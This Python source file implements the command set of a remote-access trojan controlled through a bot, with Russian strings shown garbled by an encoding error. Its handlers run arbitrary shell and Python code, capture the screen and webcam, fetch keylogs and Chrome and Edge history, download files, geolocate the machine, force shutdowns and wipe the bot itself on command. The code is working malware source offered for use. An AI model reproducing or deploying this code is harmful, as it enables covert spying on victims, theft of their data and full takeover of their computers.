# –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏
import ctypes
import getpass
import os
import platform
import shutil
import socket
import sys
from datetime import datetime
from io import StringIO
from subprocess import Popen, PIPE
from time import strftime, sleep

# –°–µ—Ç–µ–≤—ã–µ
import requests
from urllib.request import urlretrieve

# –°—Ç–æ—Ä–æ–Ω–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏
import cv2
import keyboard
import numpy as np
import pyautogui
from PIL import ImageDraw
from pynput.mouse import Controller, Button

# –õ–æ–∫–∞–ª—å–Ω—ã–µ –º–æ–¥—É–ª–∏
from config import *
from loggers import get_browser_history_log_to_file

mouse = Controller()
current_working_directory = os.getcwd()


def checkchat_id(chat_id):
    return len(KNOWN_IDS) == 0 or str(chat_id) in KNOWN_IDS


def internal_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('google.com', 0))
    return s.getsockname()[0]


def move_mouse_direction(direction, offset):
    x, y = pyautogui.position()
    offset = int(offset)
    if direction == '–ª–µ–≤–µ–µ':
        x -= offset
    elif direction == '–ø—Ä–∞–≤–µ–µ':
        x += offset
    elif direction == '–≤—ã—à–µ':
        y -= offset
    elif direction == '–Ω–∏–∂–µ':
        y += offset
    else:
        return None
    pyautogui.moveTo(x, y)
    return f"üñ±Ô∏è –ú—ã—à—å –ø–µ—Ä–µ–º–µ—â–µ–Ω–∞ {direction} –Ω–∞ {offset} –ø–∏–∫—Å–µ–ª–µ–π ‚Üí –Ω–æ–≤–∞—è –ø–æ–∑–∏—Ü–∏—è: ({x}, {y})"


def ping():
    return f"{platform.uname()[1]}: –Ø –≤ —Å–µ—Ç–∏ ‚úÖ"


def confirm_self_destruct():
    return "‚ö†Ô∏è –í—ã —É–≤–µ—Ä–µ–Ω—ã? –ù–∞–ø–∏—à–∏—Ç–µ /destroy –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è"


def get_start_message():
    return (
        "ü§ñ –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é –±–æ—Ç–∞\n\n"
        "üìå –û—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã\n"
        "/start ‚Äî –ü–æ–∫–∞–∑–∞—Ç—å —Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥\n"
        "/ping ‚Äî –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –±–æ—Ç–∞\n\n"
        "üì∑ –†–∞–±–æ—Ç–∞ —Å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è–º–∏/–≤–∏–¥–µ–æ\n"
        "/capture_pc ‚Äî –°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞\n"
        "/video_pc <sec> ‚Äî –°–¥–µ–ª–∞—Ç—å –∑–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞\n"
        "/capture_webcam ‚Äî –°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã\n"
        "/wallpaper <–ø—É—Ç—å –∏–ª–∏ URL> ‚Äî –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –æ–±–æ–∏ –Ω–∞ —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª\n\n"
        "üîç –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ\n"
        "/ip_info ‚Äî –ü–æ–∫–∞–∑–∞—Ç—å IP –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é\n"
        "/pc_info ‚Äî –ü–æ–∫–∞–∑–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ\n"
        "/ls <–ø—É—Ç—å> ‚Äî –ü–æ–∫–∞–∑–∞—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –ø–∞–ø–∫–∏\n\n"
        "üíª –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º–æ–π\n"
        "/shutdown ‚Äî –í—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä\n"
        "/reboot ‚Äî –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä\n"
        "/cmd_exec <–∫–æ–º–∞–Ω–¥–∞> ‚Äî –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É —á–µ—Ä–µ–∑ CMD\n"
        "/python_exec <–≤—ã—Ä–∞–∂–µ–Ω–∏–µ> ‚Äî –í—ã–ø–æ–ª–Ω–∏—Ç—å Python-–≤—ã—Ä–∞–∂–µ–Ω–∏–µ\n\n"
        "üîê –õ–æ–≥–∏ –∏ –¥–∞–Ω–Ω—ã–µ\n"
        "/keylogs ‚Äî –ü–æ–∫–∞–∑–∞—Ç—å –ª–æ–≥–∏ –∫–ª–∞–≤–∏—à\n"
        "/user_log ‚Äî –ü–æ–∫–∞–∑–∞—Ç—å –ª–æ–≥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è\n"
        "/chrome_log ‚Äî –ò–∑–≤–ª–µ—á—å –∏—Å—Ç–æ—Ä–∏—é Chrome\n"
        "/edge_log ‚Äî –ò–∑–≤–ª–µ—á—å –∏—Å—Ç–æ—Ä–∏—é Edge\n\n"
        "üì• –†–∞–±–æ—Ç–∞ —Å —Ñ–∞–π–ª–∞–º–∏\n"
        "/download <–ø—É—Ç—å> ‚Äî –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª\n"
        "/create_more_folders <–∫–æ–ª-–≤–æ –ø–∞–ø–æ–∫> <–±–∞–∑–æ–≤–æ–µ –∏–º—è> <—Ç–µ–∫—Å—Ç> ‚Äî –°–æ–∑–¥–∞—Ç—å –º–Ω–æ–≥–æ –ø–∞–ø–æ–∫ —Å txt —Ñ–∞–π–ª–∞–º–∏\n"
        "/run <–ø—É—Ç—å> ‚Äî –ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª\n\n"
        "üñ±Ô∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º—ã—à—å—é\n"
        "/move_mouse_coord x y ‚Äî –ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å –∫—É—Ä—Å–æ—Ä –º—ã—à–∏\n"
        "/move_mouse (–ª–µ–≤–µ–µ/–ø—Ä–∞–≤–µ–µ/–Ω–∏–∂–µ/–≤—ã—à–µ) x ‚Äî –ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å –∫—É—Ä—Å–æ—Ä –º—ã—à–∏ –Ω–∞ X\n"
        "/click_mouse ‚Äî –ö–ª–∏–∫–Ω—É—Ç—å –º—ã—à—å—é\n\n"
        "üì¢ –í–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º\n"
        "/msg_box <—Ç–µ–∫—Å—Ç> ‚Äî –ü–æ–∫–∞–∑–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –Ω–∞ —ç–∫—Ä–∞–Ω–µ\n"
        "/message_write \"—Ç–µ–∫—Å—Ç\" ‚Äî –í–≤–µ—Å—Ç–∏ —Ç–µ–∫—Å—Ç –≤ –∞–∫—Ç–∏–≤–Ω–æ–µ –ø–æ–ª–µ\n\n"
        "‚ö†Ô∏è –û–ø–∞—Å–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã\n"
        "/self_destruct ‚Äî –ó–∞–ø—Ä–æ—Å –Ω–∞ —É–¥–∞–ª–µ–Ω–∏–µ –±–æ—Ç–∞\n"
    )


def execute_cmd(command_text):
    global current_working_directory
    cmd = command_text.strip()
    if cmd.lower().startswith('cd'):
        parts = cmd.split(maxsplit=1)
        if len(parts) == 2:
            new_path = parts[1].strip('"')
            resolved_path = os.path.abspath(os.path.join(current_working_directory, new_path))
            if os.path.isdir(resolved_path):
                current_working_directory = resolved_path
                return current_working_directory
            else:
                return f'–ü–∞–ø–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: {resolved_path}'
        else:
            return current_working_directory
    else:
        process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, cwd=current_working_directory)
        out, err = process.communicate()
        return (out + err).decode(errors='ignore') or '[–ø—É—Å—Ç–æ–π –≤—ã–≤–æ–¥]'


def capture_pc():
    screenshot = pyautogui.screenshot()
    cursor_x, cursor_y = pyautogui.position()

    draw = ImageDraw.Draw(screenshot)
    radius = 8
    draw.ellipse(
        (cursor_x - radius, cursor_y - radius, cursor_x + radius, cursor_y + radius),
        fill='red', outline='black'
    )  # —Ä–∏—Å—É–µ–º –∫—Ä—É–≥ —Ç–∞–º –≥–¥–µ –∫—É—Ä—Å–æ—Ä

    path = os.path.join(LOG_DIR, 'screenshot.jpg')
    screenshot.save(path)
    return path, f"üñ±Ô∏è –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã –∫—É—Ä—Å–æ—Ä–∞: ({cursor_x}, {cursor_y})"


def record_screen(duration_seconds=60):
    try:
        screen_size = pyautogui.size()
        fps = 15
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_path = os.path.join(LOG_DIR, f"screen_record_{timestamp}.mp4")

        out = cv2.VideoWriter(output_path, fourcc, fps, screen_size)
        frame_count = int(duration_seconds * fps)

        for _ in range(frame_count):
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
            sleep(1 / fps)

        out.release()
        cv2.destroyAllWindows()

        return output_path, "‚úÖ –ó–∞–ø–∏—Å—å —Å —ç–∫—Ä–∞–Ω–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞"

    except Exception as e:
        return f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ —ç–∫—Ä–∞–Ω–∞: {e}"


def capture_webcam():
    camera = cv2.VideoCapture(0)
    ret, image = camera.read()
    path = os.path.join(LOG_DIR, 'webcam.jpg')
    if ret:
        cv2.imwrite(path, image)
        camera.release()
        return path
    camera.release()
    return None


def python_exec(code):
    temp_path = os.path.join(LOG_DIR, 'python_output.txt')
    old_stdout = sys.stdout
    sys.stdout = mystdout = StringIO()
    try:
        exec(code)
        sys.stdout = old_stdout
        result = mystdout.getvalue()
        if result.strip():
            with open(temp_path, 'w', encoding='utf-8') as f:
                f.write(result)
            return temp_path, None
        else:
            return None, '‚úÖ –ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω. –ù–µ—Ç –≤—ã–≤–æ–¥–∞.'
    except Exception as e:
        sys.stdout = old_stdout
        return None, f'‚ö†Ô∏è –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {e}'


def msg_box(text):
    if text:
        ctypes.windll.user32.MessageBoxW(0, text, u'üì¢ –°–æ–æ–±—â–µ–Ω–∏–µ', 0x40)
        return 'üì¨ –û–∫–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ–∫–∞–∑–∞–Ω–æ.'
    return '–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /msg_box –≤–∞—à —Ç–µ–∫—Å—Ç'


def move_mouse_coord(x, y):
    try:
        mouse.position = (x, y)
        return f'üñ±Ô∏è –ú—ã—à—å –ø–µ—Ä–µ–º–µ—â–µ–Ω–∞ –≤ ({x}, {y})'
    except Exception as e:
        return f'–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è –º—ã—à–∏: {e}'


def click_mouse():
    try:
        mouse.click(Button.left, 1)
        return 'üñ±Ô∏è –ö–ª–∏–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω'
    except Exception as e:
        return f'–û—à–∏–±–∫–∞ –∫–ª–∏–∫–∞: {e}'


def message_write(text):
    try:
        keyboard.write(text, delay=0.05)
        return f'üì® –°–æ–æ–±—â–µ–Ω–∏–µ –≤–≤–µ–¥–µ–Ω–æ: "{text}"'
    except Exception as e:
        return f'‚ö†Ô∏è –û—à–∏–±–∫–∞ –≤–≤–æ–¥–∞: {e}'


def get_pc_info():
    info = '\n'.join(platform.uname())
    return f"{info}\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {getpass.getuser()}"


def get_ip_info():
    try:
        info = requests.get('http://ipinfo.io').json()
        location = info.get('loc', '0,0').split(',')
        ip = info.get('ip')
        city = info.get('city')
        region = info.get('region')
        internal = internal_ip()
        return {
            'location': (float(location[0]), float(location[1])),
            'text': f"üåê IP: {ip}\nüìç –ì–æ—Ä–æ–¥: {city}, {region}\nüîí –í–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π IP: {internal}"
        }
    except Exception as e:
        return {'location': (0.0, 0.0), 'text': f'–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP: {e}'}


def list_directory(path):
    try:
        files = os.listdir(path if path else os.getcwd())
        return '\n'.join(files)
    except Exception as e:
        return f'–û—à–∏–±–∫–∞ –ø—Ä–∏ —á—Ç–µ–Ω–∏–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏: {e}'


def shutdown():
    os.system('shutdown /s /f /t 0')
    return 'üí§ –ö–æ–º–ø—å—é—Ç–µ—Ä –±—É–¥–µ—Ç –≤—ã–∫–ª—é—á–µ–Ω —Å–µ–π—á–∞—Å.'


def reboot():
    os.system('shutdown /r /f /t 0')
    return 'üîÑ –ö–æ–º–ø—å—é—Ç–µ—Ä –±—É–¥–µ—Ç –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–µ–Ω —Å–µ–π—á–∞—Å.'


def download_file(path):
    if os.path.isfile(path):
        return path
    return None


def run_file(path):
    if os.path.isfile(path):
        os.startfile(path)
        return f'–§–∞–π–ª –∑–∞–ø—É—â–µ–Ω: {path}'
    return f'–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω: {path}'


def set_wallpaper(path):
    try:
        if path.startswith('http'):
            filename = os.path.join(LOG_DIR, os.path.basename(path))
            urlretrieve(path, filename)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, filename, 3)
            return '–û–±–æ–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã —Å URL'
        elif os.path.isfile(path):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            return '–û–±–æ–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã —Å —Ñ–∞–π–ª–∞'
        else:
            return '–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω'
    except Exception as e:
        return f'–û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –æ–±–æ–µ–≤: {e}'


def get_keylog_file():
    with open(KEYLOG_FILE, "w") as f:
        f.write("\n\n\n-------------------------------------------------\n")
        f.write(" Log: " + strftime("%b %d@%H:%M") + "\n")
    return KEYLOG_FILE


def get_user_log_file():
    with open(LOG_FILE, "w") as f:
        f.write("-------------------------------------------------\n")
        f.write(" Log: " + strftime("%b %d@%H:%M") + "\n")
    return LOG_FILE


def get_browser_log(browser='chrome', limit=150):
    return get_browser_history_log_to_file(browser=browser, limit=limit)


def self_destruct():
    shutil.rmtree(BASE_DIR, ignore_errors=True)
    os._exit(0)


def create_desktop_folders(count_folders, base_name, filler_text):
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    created = []
    errors = []

    for i in range(count_folders):
        folder_path = os.path.join(desktop, f"{base_name}_{i}")
        try:
            os.makedirs(folder_path, exist_ok=True)
            created.append(folder_path)

            # –°–æ–∑–¥–∞—ë–º txt-—Ñ–∞–π–ª—ã –≤–Ω—É—Ç—Ä–∏ –ø–∞–ø–∫–∏
            for txt in range(count_folders):
                txt_path = os.path.join(folder_path, f"TXT_{txt}.txt")
                with open(txt_path, "w", encoding="utf-8") as f:
                    f.write(f"{filler_text * 10}")

        except Exception as e:
            errors.append(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ {folder_path}: {e}")

    if errors:
        return "\n".join(errors)
    return f"–°–æ–∑–¥–∞–Ω–æ {len(created)} –ø–∞–ø–æ–∫ —Å —Ñ–∞–π–ª–∞–º–∏:\n" + "\n".join(created)


